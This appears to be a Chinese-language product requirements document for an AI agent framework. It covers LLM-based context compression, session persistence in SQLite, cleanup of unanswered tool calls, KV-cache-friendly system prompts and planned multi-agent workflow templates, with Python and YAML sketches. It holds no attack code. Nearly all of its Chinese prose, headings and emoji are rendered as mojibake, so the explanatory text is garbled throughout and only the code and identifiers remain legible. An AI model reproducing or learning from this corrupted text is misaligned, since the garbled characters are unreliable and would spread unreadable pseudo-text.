| LLMå‹ç¼© | é¦–é€‰ | æœ€è¿‘15% context windowçš„æ¶ˆæ¯ | LLMæ€»ç»“æ‘˜è¦ |
| ç´§æ€¥æˆªæ–­ | LLMå‹ç¼©å¤±è´¥ | æœ€è¿‘100æ¡æ¶ˆæ¯ | ç›´æ¥åˆ é™¤æ—§æ¶ˆæ¯ |

**ä¿ç•™æ¶ˆæ¯è®¡ç®—**(æ··åˆç­–ç•¥):

```python
# ç­–ç•¥1: åŸºäºTokenæ¯”ä¾‹
keep_tokens = context_window * keep_recent_ratio  # é»˜è®¤15%
keep_message_count = estimate_messages_by_tokens(keep_tokens)

# ç­–ç•¥2: åŸºäºæ¶ˆæ¯æ•°é‡
keep_message_count = max(keep_recent_messages, keep_message_count)  # è‡³å°‘10æ¡

# æœ€ç»ˆ: ä¸¤è€…ä¸­å…ˆè¾¾åˆ°çš„
recent_messages = messages[-keep_message_count:]
```

**LLMå‹ç¼©æµç¨‹**:

```
1. ç¡®å®šä¿ç•™æ¶ˆæ¯æ•°é‡(keep_recent_ratio=15% æˆ– keep_recent_messages=10)
2. åˆ†ç¦»æ¶ˆæ¯:
   - to_compress: messages[:-keep_count]
   - recent: messages[-keep_count:]
3. è°ƒç”¨LLMå‹ç¼©:
   - æç¤ºè¯:"è¯·æ€»ç»“ä»¥ä¸‹å¯¹è¯å†…å®¹,ä¿ç•™å…³é”®ä¿¡æ¯ã€å†³ç­–ã€ä¸Šä¸‹æ–‡"
   - è¾“å…¥: to_compress
   - è¾“å‡º: å‹ç¼©æ‘˜è¦(AIMessage)
4. é‡ç»„æ¶ˆæ¯:
   - [SystemMessage, å‹ç¼©æ‘˜è¦, *recent_messages]
5. é‡ç½®Tokenè®¡æ•°å™¨
```

**å‹ç¼©ç¤ºä¾‹**:

```
å‹ç¼©å‰: 302æ¡æ¶ˆæ¯(123K tokens)
  - SystemMessage(1æ¡)
  - å¯¹è¯å†å²(301æ¡): ç”¨æˆ·éœ€æ±‚è®¨è®ºã€ä»£ç å®ç°ã€æµ‹è¯•ã€è°ƒè¯•...

å‹ç¼©å: 13æ¡æ¶ˆæ¯(6.5K tokens, å‹ç¼©æ¯”95%)
  - SystemMessage(1æ¡)
  - å‹ç¼©æ‘˜è¦(1æ¡): "ç”¨æˆ·è¦æ±‚å®ç°XXåŠŸèƒ½,è®¨è®ºäº†ABCæ–¹æ¡ˆ,æœ€ç»ˆé€‰æ‹©..."
  - æœ€è¿‘å¯¹è¯(11æ¡): ä¿ç•™å®Œæ•´ä¸Šä¸‹æ–‡
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… Tokenä½¿ç”¨ç‡>95%æ—¶è‡ªåŠ¨è§¦å‘
- âœ… ä¿ç•™æœ€è¿‘15% context windowçš„æ¶ˆæ¯(æˆ–è‡³å°‘10æ¡)
- âœ… LLMå‹ç¼©å¤±è´¥æ—¶å›é€€åˆ°ç´§æ€¥æˆªæ–­
- âœ… ç”¨æˆ·æ— æ„ŸçŸ¥(æ— é€šçŸ¥æ¶ˆæ¯)
- âœ… å‹ç¼©åæ­£ç¡®é‡ç½®Tokenè®¡æ•°å™¨

**å®ç°å‚è€ƒ**:`generalAgent/context/compressor.py`ã€`generalAgent/graph/nodes/summarization.py`

---

#### éœ€æ±‚3:ä¼šè¯æŒä¹…åŒ–

**éœ€æ±‚æè¿°**:
æ”¯æŒä¼šè¯çŠ¶æ€çš„ä¿å­˜å’Œæ¢å¤,ä½¿ç”¨SQLite Checkpointerå­˜å‚¨å®Œæ•´å¯¹è¯å†å²ã€‚

**å­˜å‚¨å†…å®¹**:

```python
# æ¯ä¸ªä¼šè¯å­˜å‚¨çš„çŠ¶æ€
{
    "thread_id": "abc123",
    "messages": [...],  # æ¶ˆæ¯å†å²
    "mentioned_agents": [...],  # @mentionè®°å½•
    "active_skill": "pdf",
    "workspace_path": "/data/workspace/abc123",
    "uploaded_files": [...],
    "todos": [...],
    "compact_count": 2,  # å‹ç¼©æ¬¡æ•°
    "cumulative_prompt_tokens": 45000,
    "last_updated": "2025-10-31T12:34:56Z"
}
```

**CLIå‘½ä»¤**:

| å‘½ä»¤ | åŠŸèƒ½ | ç¤ºä¾‹ |
|------|------|------|
| `/sessions` | åˆ—å‡ºæ‰€æœ‰ä¼šè¯ | æ˜¾ç¤ºIDã€åˆ›å»ºæ—¶é—´ã€æ¶ˆæ¯æ•° |
| `/load <id>` | åŠ è½½ä¼šè¯ | `/load abc` (æ”¯æŒå‰ç¼€åŒ¹é…) |
| `/reset` | é‡ç½®å½“å‰ä¼šè¯ | æ¸…ç©ºå†å²,é‡æ–°å¼€å§‹ |
| `/current` | æ˜¾ç¤ºå½“å‰ä¼šè¯ä¿¡æ¯ | æ˜¾ç¤ºthread_idã€æ¶ˆæ¯æ•°ã€Tokenä½¿ç”¨ |

**ä¼šè¯åˆ—è¡¨ç¤ºä¾‹**:

```
=== å†å²ä¼šè¯ ===

1. abc123  (2025-10-30 14:23)
   - æ¶ˆæ¯æ•°: 45
   - æœ€åæ´»åŠ¨: 1å¤©å‰
   - æŠ€èƒ½: pdf, docx

2. def456  (2025-10-31 09:15)
   - æ¶ˆæ¯æ•°: 120
   - æœ€åæ´»åŠ¨: 3å°æ—¶å‰
   - å‹ç¼©æ¬¡æ•°: 2

ä½¿ç”¨ /load <id> æ¢å¤ä¼šè¯
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… ä¼šè¯çŠ¶æ€100%æ¢å¤(æ¶ˆæ¯ã€å·¥å…·ã€æŠ€èƒ½)
- âœ… æ”¯æŒè‡³å°‘1000ä¸ªå¹¶å‘ä¼šè¯
- âœ… æ¢å¤æ—¶é—´<500ms
- âœ… æ”¯æŒå‰ç¼€åŒ¹é…åŠ è½½(`/load abc`)
- âœ… è‡ªåŠ¨ä¿å­˜(æ¯è½®å¯¹è¯å)

**å®ç°å‚è€ƒ**:`shared/session/store.py`ã€`shared/session/manager.py`

---

#### éœ€æ±‚4:æ¶ˆæ¯å†å²æ¸…ç†

**éœ€æ±‚æè¿°**:
è‡ªåŠ¨æ¸…ç†æ— æ•ˆæ¶ˆæ¯,ç¡®ä¿OpenAI APIå…¼å®¹æ€§,é¿å…å› æœªå“åº”çš„tool_callså¯¼è‡´é”™è¯¯ã€‚

**æ¸…ç†è§„åˆ™**:

```python
# ç§»é™¤æœªè¢«å“åº”çš„tool_calls
def clean_message_history(messages):
    # 1. æ”¶é›†æ‰€æœ‰ToolMessage.tool_call_id
    answered_calls = {
        msg.tool_call_id
        for msg in messages
        if isinstance(msg, ToolMessage)
    }

    # 2. éå†AIMessage,æ£€æŸ¥tool_callsæ˜¯å¦æœ‰å“åº”
    cleaned = []
    for msg in messages:
        if isinstance(msg, AIMessage) and msg.tool_calls:
            # æ£€æŸ¥æ˜¯å¦æ‰€æœ‰tool_callséƒ½æœ‰å“åº”
            unanswered = [
                tc for tc in msg.tool_calls
                if tc["id"] not in answered_calls
            ]

            if unanswered:
                continue  # è·³è¿‡è¿™æ¡AIMessage

        cleaned.append(msg)

    return cleaned
```

**å®‰å…¨æˆªæ–­ç­–ç•¥**:

```python
# ä¿ç•™AIMessage-ToolMessageå¯¹
def truncate_messages_safely(messages, keep_recent=40):
    # 1. è¯†åˆ«tool_callå¯¹
    tool_call_pairs = {}  # tool_call_id -> (ai_idx, tool_idx)

    # 2. ç¡®å®šä¿ç•™èŒƒå›´
    cutoff_idx = len(messages) - keep_recent

    # 3. å¦‚æœä¿ç•™ToolMessage,å¿…é¡»ä¿ç•™å¯¹åº”çš„AIMessage
    must_keep = set(range(cutoff_idx, len(messages)))

    for i in range(cutoff_idx, len(messages)):
        if isinstance(messages[i], ToolMessage):
            call_id = messages[i].tool_call_id
            if call_id in tool_call_pairs:
                ai_idx = tool_call_pairs[call_id]["ai_idx"]
                must_keep.add(ai_idx)

    # 4. æ„å»ºç»“æœ
    return [messages[i] for i in sorted(must_keep)]
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ¸…ç†æœªå“åº”çš„tool_calls(é¿å…OpenAI APIé”™è¯¯)
- âœ… æˆªæ–­æ—¶ä¿ç•™AIMessage-ToolMessageå¯¹
- âœ… å§‹ç»ˆä¿ç•™SystemMessage
- âœ… å¯é…ç½®æˆªæ–­é˜ˆå€¼(MAX_MESSAGE_HISTORY)

**å®ç°å‚è€ƒ**:`generalAgent/graph/message_utils.py`

---

#### éœ€æ±‚5:KV Cacheä¼˜åŒ–

**éœ€æ±‚æè¿°**:
ä¼˜åŒ–SystemMessageå’Œæé†’æœºåˆ¶,æœ€å¤§åŒ–KV Cacheå¤ç”¨ç‡,é™ä½æ¨ç†æˆæœ¬60-80%ã€‚

**ä¼˜åŒ–ç­–ç•¥**:

| ä¼˜åŒ–ç‚¹ | æ–¹æ³• | æ•ˆæœ |
|--------|------|------|
| å›ºå®šSystemMessage | å¯åŠ¨æ—¶ç”Ÿæˆä¸€æ¬¡,åŒ…å«åˆ†é’Ÿçº§æ—¶é—´æˆ³ | 70-90% KV Cacheå¤ç”¨ |
| åŠ¨æ€æé†’åç½® | è¿½åŠ åˆ°æœ€åä¸€æ¡HumanMessage | æé«˜Cacheå‘½ä¸­ç‡ |
| æ—¶é—´æˆ³ç²¾åº¦é™çº§ | åˆ†é’Ÿçº§(HH:MM)è€Œéç§’çº§ | åŒä¸€åˆ†é’Ÿå†…100%å¤ç”¨ |

**SystemMessageç»“æ„**:

```python
# å¯åŠ¨æ—¶ç”Ÿæˆä¸€æ¬¡,æ•´ä¸ªä¼šè¯æœŸé—´ä¸å˜
static_system_prompt = f"""
{PLANNER_SYSTEM_PROMPT}  # å›ºå®šæŒ‡ä»¤

{skills_catalog}  # å¯ç”¨çš„æŠ€èƒ½åˆ—è¡¨(é™æ€)

{agents_catalog}  # å¯ç”¨çš„Agentåˆ—è¡¨(é™æ€)

<current_datetime>{now.strftime('%Y-%m-%d %H:%M UTC')}</current_datetime>
"""
```

**åŠ¨æ€æé†’è¿½åŠ **:

```python
# é”™è¯¯åšæ³•(ä¿®æ”¹SystemMessage,ç ´åCache)
system_message.content += "\n\n<reminder>...</reminder>"  # âŒ

# æ­£ç¡®åšæ³•(è¿½åŠ åˆ°æœ€åä¸€æ¡HumanMessage)
last_human_message.content += "\n\n<system_reminder>...</system_reminder>"  # âœ…
```

**æˆæœ¬å¯¹æ¯”**:

| åœºæ™¯ | ä¼ ç»Ÿæ–¹å¼ | ä¼˜åŒ–å | æˆæœ¬é™ä½ |
|------|---------|--------|---------|
| çŸ­å¯¹è¯(10è½®) | 100%å…¨é‡è®¡ç®— | 90% KV Cacheå¤ç”¨ | 60% |
| é•¿å¯¹è¯(100è½®) | 100%å…¨é‡è®¡ç®— | 70% KV Cacheå¤ç”¨ | 80% |

**éªŒæ”¶æ ‡å‡†**:
- âœ… SystemMessageåœ¨ä¼šè¯æœŸé—´å›ºå®šä¸å˜
- âœ… æ—¶é—´æˆ³ç²¾åº¦ä¸ºåˆ†é’Ÿçº§(HH:MM UTC)
- âœ… åŠ¨æ€æé†’è¿½åŠ åˆ°æœ€åä¸€æ¡HumanMessage
- âœ… å¤šè½®å¯¹è¯ä¸­KV Cacheå¤ç”¨ç‡â‰¥70%

**å®ç°å‚è€ƒ**:`generalAgent/graph/nodes/planner.py:86-107`

---

### éåŠŸèƒ½éœ€æ±‚

#### æ€§èƒ½éœ€æ±‚

| æŒ‡æ ‡ | ç›®æ ‡å€¼ | æµ‹é‡æ–¹æ³• |
|------|--------|---------|
| Tokenè¿½è¸ªå¼€é”€ | <10ms | extract_token_usage()è€—æ—¶ |
| å‹ç¼©è€—æ—¶ | <10s | LLMå‹ç¼©æ—¶é—´ |
| ä¼šè¯æ¢å¤ | <500ms | SQLiteåŠ è½½æ—¶é—´ |
| KV Cacheå¤ç”¨ç‡ | â‰¥70% | å¤šè½®å¯¹è¯æµ‹è¯• |

#### å¯é æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| å‹ç¼©é™çº§ç­–ç•¥ | LLMå‹ç¼©å¤±è´¥æ—¶å›é€€æˆªæ–­ | å¼‚å¸¸æ³¨å…¥æµ‹è¯• |
| ä¼šè¯æŒä¹…åŒ– | SQLiteå†™å…¥å¤±è´¥æ—¶ç»§ç»­è¿è¡Œ | å®¹é”™æµ‹è¯• |
| Tokenè®¡æ•°å‡†ç¡®æ€§ | cumulative_prompt_tokensè¯¯å·®<5% | å¯¹æ¯”APIè¿”å›å€¼ |

#### å¯ç”¨æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| å‹ç¼©æ— æ„ŸçŸ¥ | ä¸æ˜¾ç¤ºå‹ç¼©é€šçŸ¥ | ç”¨æˆ·ä½“éªŒæµ‹è¯• |
| ä¼šè¯åˆ—è¡¨æ¸…æ™° | æ˜¾ç¤ºIDã€æ—¶é—´ã€æ¶ˆæ¯æ•° | UIè¯„å®¡ |
| é…ç½®æ˜“è¯»æ€§ | .envæ³¨é‡Šå®Œæ•´ | å¼€å‘è€…5åˆ†é’Ÿä¸Šæ‰‹ |

---

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| ä¸Šä¸‹æ–‡ç®¡ç†å™¨ | `generalAgent/context/manager.py` |
| Tokenè¿½è¸ªå™¨ | `generalAgent/context/token_tracker.py` |
| ä¸Šä¸‹æ–‡å‹ç¼©å™¨ | `generalAgent/context/compressor.py` |
| æ¶ˆæ¯æˆªæ–­å™¨ | `generalAgent/context/truncator.py` |
| æ¶ˆæ¯æ¸…ç†å·¥å…· | `generalAgent/graph/message_utils.py` |
| SummarizationèŠ‚ç‚¹ | `generalAgent/graph/nodes/summarization.py` |
| ä¼šè¯å­˜å‚¨ | `shared/session/store.py` |
| ä¼šè¯ç®¡ç†å™¨ | `shared/session/manager.py` |
| é…ç½®å‚æ•° | `generalAgent/config/settings.py:ContextManagementSettings` |

---


# Workflow æ¨¡æ¿ (è®¡åˆ’ä¸­)

## äº§å“å®šä½

Workflowæ¨¡æ¿ç³»ç»Ÿæ˜¯æ¡†æ¶çš„**é«˜çº§ç¼–æ’èƒ½åŠ›**,æä¾›é¢„å®šä¹‰çš„å¤šAgentåä½œæ¨¡å¼,å¸®åŠ©å¼€å‘è€…å¿«é€Ÿæ„å»ºå¤æ‚çš„AIå·¥ä½œæµã€‚åŸºäºç°æœ‰çš„`delegate_task`å’Œ`call_agent`èƒ½åŠ›,Workflowæ¨¡æ¿å°†å¸¸è§åä½œæ¨¡å¼æ ‡å‡†åŒ–ã€å¯é…ç½®åŒ–ã€‚

**æ ¸å¿ƒç†å¿µ**:
- ğŸ”§ **å¼€ç®±å³ç”¨** - é¢„å®šä¹‰çš„åä½œæ¨¡å¼,æ— éœ€ä»é›¶è®¾è®¡
- ğŸ¯ **åœºæ™¯é©±åŠ¨** - é’ˆå¯¹å¸¸è§ä¸šåŠ¡åœºæ™¯ä¼˜åŒ–
- ğŸ”Œ **å¯ç»„åˆ** - æ¨¡æ¿å¯åµŒå¥—å’Œç»„åˆä½¿ç”¨
- ğŸ“Š **å¯è§‚æµ‹** - å†…ç½®è¿›åº¦è¿½è¸ªå’ŒçŠ¶æ€ç®¡ç†

---

## ä¸‰ç§æ ¸å¿ƒæ¨¡å¼

### æ¨¡å¼ 1: Pipeline æ¨¡å¼ (æµæ°´çº¿)

**é€‚ç”¨åœºæ™¯**:
- å¤šæ­¥éª¤é¡ºåºå¤„ç†(æ•°æ®ETLã€æ–‡æ¡£å¤„ç†æµç¨‹)
- æ¯æ­¥è¾“å‡ºæ˜¯ä¸‹ä¸€æ­¥è¾“å…¥
- éœ€è¦é˜¶æ®µæ€§ç»“æœéªŒè¯

**å·¥ä½œåŸç†**:
```
Agent A (æ•°æ®é‡‡é›†)
  â†’ è¾“å‡º: raw_data.json

Agent B (æ•°æ®æ¸…æ´—)
  â†’ è¾“å…¥: raw_data.json
  â†’ è¾“å‡º: cleaned_data.json

Agent C (æ•°æ®åˆ†æ)
  â†’ è¾“å…¥: cleaned_data.json
  â†’ è¾“å‡º: report.pdf
```

**å…¸å‹ç”¨ä¾‹**:
- ğŸ“„ æ–‡æ¡£å¤„ç†æµæ°´çº¿: PDFæå– â†’ å†…å®¹åˆ†æ â†’ æŠ¥å‘Šç”Ÿæˆ
- ğŸ“Š æ•°æ®å¤„ç†æµæ°´çº¿: çˆ¬å–æ•°æ® â†’ æ¸…æ´— â†’ åˆ†æ â†’ å¯è§†åŒ–
- ğŸ” ç ”ç©¶å·¥ä½œæµ: æœç´¢èµ„æ–™ â†’ æ€»ç»“è¦ç‚¹ â†’ æ’°å†™æŠ¥å‘Š

**å®ç°æ–¹å¼**:
```python
# åŸºäº delegate_task å®ç°
result_a = delegate_task("é‡‡é›†æ•°æ®...")
result_b = delegate_task(f"æ¸…æ´—æ•°æ®: {result_a}")
result_c = delegate_task(f"åˆ†ææ•°æ®: {result_b}")
```

---

### æ¨¡å¼ 2: Parallel æ¨¡å¼ (å¹¶è¡Œ)

**é€‚ç”¨åœºæ™¯**:
- ç‹¬ç«‹å­ä»»åŠ¡å¯å¹¶è¡Œæ‰§è¡Œ
- éœ€è¦æ±‡æ€»å¤šä¸ªæ¥æºçš„ç»“æœ
- åŠ é€Ÿæ•´ä½“æ‰§è¡Œæ—¶é—´

**å·¥ä½œåŸç†**:
```
                â”Œâ”€â†’ Agent A (æœç´¢æŠ€æœ¯æ–‡æ¡£) â”€â”
                â”‚                           â”‚
Main Agent â”€â”€â”€â”€â”€â”¼â”€â†’ Agent B (æœç´¢å­¦æœ¯è®ºæ–‡) â”€â”¼â”€â†’ Aggregator â†’ ç»¼åˆæŠ¥å‘Š
                â”‚                           â”‚
                â””â”€â†’ Agent C (æœç´¢å®è·µæ¡ˆä¾‹) â”€â”˜

(å¹¶è¡Œæ‰§è¡Œ, äº’ä¸ä¾èµ–)
```

**å…¸å‹ç”¨ä¾‹**:
- ğŸ” å¤šæºä¿¡æ¯èšåˆ: åŒæ—¶æœç´¢æ–‡æ¡£ã€è®ºæ–‡ã€ä»£ç ã€æ¡ˆä¾‹
- ğŸŒ å¤šè¯­è¨€ç¿»è¯‘: åŒæ—¶ç¿»è¯‘æˆå¤šç§è¯­è¨€
- ğŸ“Š å¤šç»´åº¦åˆ†æ: åŒæ—¶åˆ†ææŠ€æœ¯ã€æˆæœ¬ã€é£é™©

**å®ç°æ–¹å¼**:
```python
# åŸºäº delegate_task å¹¶å‘å®ç° (è®¡åˆ’ä¸­)
tasks = [
    delegate_task("æœç´¢æŠ€æœ¯æ–‡æ¡£"),
    delegate_task("æœç´¢å­¦æœ¯è®ºæ–‡"),
    delegate_task("æœç´¢å®è·µæ¡ˆä¾‹")
]
results = await asyncio.gather(*tasks)  # å¹¶è¡Œæ‰§è¡Œ
final = aggregate(results)
```

---

### æ¨¡å¼ 3: Hierarchical æ¨¡å¼ (å±‚çº§)

**é€‚ç”¨åœºæ™¯**:
- å¤æ‚ä»»åŠ¡éœ€è¦åˆ†è§£å’Œå§”æ´¾
- æœ‰ä¸»ç®¡-å‘˜å·¥çš„å±‚çº§å…³ç³»
- éœ€è¦åŠ¨æ€ä»»åŠ¡åˆ†é…

**å·¥ä½œåŸç†**:
```
Manager Agent (é¡¹ç›®ç»ç†)
  â”œâ”€ åˆ†è§£ä»»åŠ¡
  â”œâ”€ åˆ†é…ç»™Worker Agents
  â”œâ”€ ç›‘æ§è¿›åº¦
  â””â”€ æ±‡æ€»ç»“æœ

     â”œâ”€â†’ Worker A (å‰ç«¯å¼€å‘)
     â”œâ”€â†’ Worker B (åç«¯å¼€å‘)
     â””â”€â†’ Worker C (æµ‹è¯•)
```

**å…¸å‹ç”¨ä¾‹**:
- ğŸ—ï¸ é¡¹ç›®ç®¡ç†: ç»ç†åˆ†é…ä»»åŠ¡ç»™å›¢é˜Ÿæˆå‘˜
- ğŸ“ å†…å®¹åˆ›ä½œ: ä¸»ç¼–åˆ†é…ç« èŠ‚ç»™ä½œè€…
- ğŸ”¬ ç ”ç©¶é¡¹ç›®: PIåˆ†é…ç ”ç©¶ä»»åŠ¡ç»™ç ”ç©¶å‘˜

**å®ç°æ–¹å¼**:
```python
# åŸºäº delegate_task å®ç°
class ManagerAgent:
    def execute(self, task):
        # 1. åˆ†è§£ä»»åŠ¡
        subtasks = self.decompose(task)

        # 2. å§”æ´¾ç»™Worker Agents
        results = []
        for subtask in subtasks:
            result = delegate_task(subtask)
            results.append(result)

        # 3. æ±‡æ€»ç»“æœ
        return self.aggregate(results)
```

---

## é€šç”¨èƒ½åŠ›

### 1. çŠ¶æ€ä¼ é€’

**èƒ½åŠ›**: åœ¨Agentä¹‹é—´ä¼ é€’ä¸Šä¸‹æ–‡å’ŒçŠ¶æ€

**æœºåˆ¶**:
- æ–‡ä»¶ä¼ é€’: é€šè¿‡workspaceå…±äº«æ–‡ä»¶
- å‚æ•°ä¼ é€’: é€šè¿‡task_descriptionä¼ é€’å…³é”®ä¿¡æ¯
- çŠ¶æ€å­˜å‚¨: é€šè¿‡workspace/outputs/ä¿å­˜ä¸­é—´ç»“æœ

**ç¤ºä¾‹**:
```python
# Agent A ç”Ÿæˆç»“æœ
write_file("outputs/step1_result.json", result)

# Agent B è¯»å–ç»“æœ
delegate_task("è¯»å– outputs/step1_result.json å¹¶ç»§ç»­å¤„ç†")
```

---

### 2. é”™è¯¯å¤„ç†

**èƒ½åŠ›**: å¤„ç†Workflowæ‰§è¡Œä¸­çš„å¼‚å¸¸

**ç­–ç•¥**:
- âœ… **è‡ªåŠ¨é‡è¯•**: Workerå¤±è´¥æ—¶è‡ªåŠ¨é‡è¯•(æœ€å¤šNæ¬¡)
- âœ… **é™çº§å¤„ç†**: å…³é”®æ­¥éª¤å¤±è´¥æ—¶ä½¿ç”¨å¤‡ç”¨æ–¹æ¡ˆ
- âœ… **éƒ¨åˆ†æˆåŠŸ**: Parallelæ¨¡å¼ä¸‹å…è®¸éƒ¨åˆ†ä»»åŠ¡å¤±è´¥
- âœ… **é”™è¯¯ä¸ŠæŠ¥**: å°†é”™è¯¯ä¿¡æ¯æ±‡æ€»ç»™Manager

**ç¤ºä¾‹**:
```python
try:
    result = delegate_task(subtask)
except Exception as e:
    # é‡è¯•æˆ–é™çº§
    result = fallback_method(subtask)
```

---

### 3. è¿›åº¦è¿½è¸ª

**èƒ½åŠ›**: å®æ—¶ç›‘æ§Workflowæ‰§è¡Œè¿›åº¦

**æœºåˆ¶**:
- ğŸ“Š TODOåˆ—è¡¨: æ¯ä¸ªAgentç»´æŠ¤è‡ªå·±çš„ä»»åŠ¡åˆ—è¡¨
- ğŸ“ˆ è¿›åº¦ç™¾åˆ†æ¯”: Managerç»Ÿè®¡å®Œæˆ/æ€»ä»»åŠ¡æ•°
- ğŸ”” é‡Œç¨‹ç¢‘é€šçŸ¥: å…³é”®æ­¥éª¤å®Œæˆæ—¶é€šçŸ¥ç”¨æˆ·

**ç¤ºä¾‹**:
```python
# Manager Agentè¿½è¸ªè¿›åº¦
total = len(subtasks)
completed = 0

for subtask in subtasks:
    result = delegate_task(subtask)
    completed += 1
    progress = f"{completed}/{total} ({completed/total*100:.0f}%)"
    print(f"è¿›åº¦: {progress}")
```

---

## é…ç½®åŒ–è®¾è®¡ (è®¡åˆ’)

### Workflowé…ç½®æ–‡ä»¶

```yaml
# workflows/document_processing.yaml
name: "æ–‡æ¡£å¤„ç†æµæ°´çº¿"
description: "PDFæå– â†’ åˆ†æ â†’ æŠ¥å‘Šç”Ÿæˆ"
mode: pipeline

steps:
  - name: extract
    agent: GeneralAgent
    task: "æå–PDFå†…å®¹"
    skills: ["@pdf"]
    output: "outputs/extracted.txt"

  - name: analyze
    agent: GeneralAgent
    task: "åˆ†ææå–çš„å†…å®¹"
    input: "outputs/extracted.txt"
    output: "outputs/analysis.json"

  - name: report
    agent: GeneralAgent
    task: "ç”Ÿæˆåˆ†ææŠ¥å‘Š"
    input: "outputs/analysis.json"
    output: "outputs/report.md"

error_handling:
  retry_count: 2
  fallback: "é€šçŸ¥ç”¨æˆ·å¤±è´¥åŸå› "
```

---

## å®ç°è·¯çº¿å›¾ (è®¡åˆ’)

### Phase 1: åŸºç¡€æ”¯æŒ (å½“å‰)
- âœ… `delegate_task` - æ”¯æŒPipelineå’ŒHierarchicalæ¨¡å¼
- âœ… `call_agent` - æ”¯æŒè·¨Agentç±»å‹è°ƒç”¨
- âœ… å·¥ä½œåŒºå…±äº« - é€šè¿‡workspaceä¼ é€’æ–‡ä»¶

### Phase 2: å¹¶è¡Œæ”¯æŒ (v4.0)
- ğŸ”„ å¹¶å‘æ‰§è¡Œ - æ”¯æŒå¤šä¸ªdelegate_taskå¹¶è¡Œ
- ğŸ”„ ç»“æœèšåˆ - è‡ªåŠ¨æ”¶é›†å¹¶è¡Œä»»åŠ¡ç»“æœ
- ğŸ”„ è¶…æ—¶æ§åˆ¶ - è®¾ç½®å¹¶è¡Œä»»åŠ¡çš„è¶…æ—¶æ—¶é—´

### Phase 3: Workflow DSL (v4.5)
- ğŸ“‹ YAMLé…ç½® - é€šè¿‡é…ç½®æ–‡ä»¶å®šä¹‰Workflow
- ğŸ“‹ å¯è§†åŒ–ç¼–è¾‘å™¨ - æ‹–æ‹½å¼Workflowè®¾è®¡
- ğŸ“‹ æ¨¡æ¿å¸‚åœº - å…±äº«å’Œå¤ç”¨Workflowæ¨¡æ¿

### Phase 4: é«˜çº§ç‰¹æ€§ (v5.0)
- ğŸš€ æ¡ä»¶åˆ†æ”¯ - æ ¹æ®ç»“æœé€‰æ‹©ä¸åŒè·¯å¾„
- ğŸš€ å¾ªç¯æ‰§è¡Œ - æ”¯æŒè¿­ä»£å¼ä»»åŠ¡
- ğŸš€ äººå·¥å¹²é¢„ç‚¹ - åœ¨å…³é”®æ­¥éª¤æš‚åœç­‰å¾…å®¡æ‰¹
- ğŸš€ æ€§èƒ½ä¼˜åŒ– - æ™ºèƒ½è°ƒåº¦å’Œèµ„æºç®¡ç†

---

## å‚è€ƒå®ç°

### ç°æœ‰èƒ½åŠ›åŸºç¡€

**å½“å‰å¯ç”¨**:
- `generalAgent/tools/builtin/delegate_task.py` - Subagentå§”æ´¾
- `generalAgent/tools/builtin/call_agent.py` - è·¨Agentè°ƒç”¨
- `generalAgent/persistence/workspace.py` - å·¥ä½œåŒºç®¡ç†
- `generalAgent/tools/builtin/todo_write.py` - è¿›åº¦è¿½è¸ª

**å‚è€ƒæ¡ˆä¾‹**:
- å¤šAgentåä½œç« èŠ‚: docs/æ¡Œé¢ AI æ¡†æ¶éœ€æ±‚.md:2115-2230
- äº§å“æ¶æ„ - å¤šAgentæµç¨‹: docs/æ¡Œé¢ AI æ¡†æ¶éœ€æ±‚.md:908-938

---

## ä½¿ç”¨ç¤ºä¾‹ (æ¦‚å¿µ)

### Pipelineç¤ºä¾‹

```python
# æ–‡æ¡£å¤„ç†æµæ°´çº¿
async def document_processing_workflow(pdf_path: str):
    # Step 1: æå–å†…å®¹
    extraction = await delegate_task(
        f"æå– {pdf_path} çš„æ‰€æœ‰æ–‡æœ¬å†…å®¹,ä¿å­˜åˆ° outputs/extracted.txt"
    )

    # Step 2: åˆ†æå†…å®¹
    analysis = await delegate_task(
        "è¯»å– outputs/extracted.txt,åˆ†æä¸»é¢˜å’Œå…³é”®ä¿¡æ¯,ä¿å­˜åˆ° outputs/analysis.json"
    )

    # Step 3: ç”ŸæˆæŠ¥å‘Š
    report = await delegate_task(
        "è¯»å– outputs/analysis.json,ç”Ÿæˆmarkdownæ ¼å¼çš„åˆ†ææŠ¥å‘Š,ä¿å­˜åˆ° outputs/report.md"
    )

    return report
```

### Parallelç¤ºä¾‹

```python
# å¤šæºä¿¡æ¯èšåˆ
async def multi_source_research(topic: str):
    # å¹¶è¡Œæœç´¢å¤šä¸ªæ¥æº
    tasks = [
        delegate_task(f"@search_web æœç´¢å…³äº'{topic}'çš„æŠ€æœ¯æ–‡æ¡£"),
        delegate_task(f"@search_web æœç´¢å…³äº'{topic}'çš„å­¦æœ¯è®ºæ–‡"),
        delegate_task(f"æœç´¢GitHubä¸Šå…³äº'{topic}'çš„çƒ­é—¨é¡¹ç›®")
    ]

    # ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ
    results = await asyncio.gather(*tasks)

    # æ±‡æ€»ç»“æœ
    summary = await delegate_task(
        f"ç»¼åˆä»¥ä¸‹ä¿¡æ¯,ç”Ÿæˆå…³äº'{topic}'çš„å…¨é¢æŠ¥å‘Š:\n" +
        "\n---\n".join(results)
    )

    return summary
```

### Hierarchicalç¤ºä¾‹

```python
# é¡¹ç›®ç®¡ç†
async def project_manager_workflow(project_desc: str):
    # Manageråˆ†è§£ä»»åŠ¡
    decomposition = await delegate_task(
        f"ä½œä¸ºé¡¹ç›®ç»ç†,å°†ä»¥ä¸‹é¡¹ç›®åˆ†è§£ä¸º3-5ä¸ªå­ä»»åŠ¡:\n{project_desc}"
    )

    # è§£æå­ä»»åŠ¡
    subtasks = parse_subtasks(decomposition)

    # åˆ†é…ç»™Worker Agents
    results = []
    for i, subtask in enumerate(subtasks, 1):
        result = await delegate_task(
            f"[Worker {i}] {subtask['description']}"
        )
        results.append(result)

    # Manageræ±‡æ€»ç»“æœ
    final_report = await delegate_task(
        f"ä½œä¸ºé¡¹ç›®ç»ç†,æ±‡æ€»ä»¥ä¸‹å·¥ä½œæˆæœ:\n" +
        "\n".join([f"- {r}" for r in results])
    )

    return final_report
```

---

## æ€»ç»“

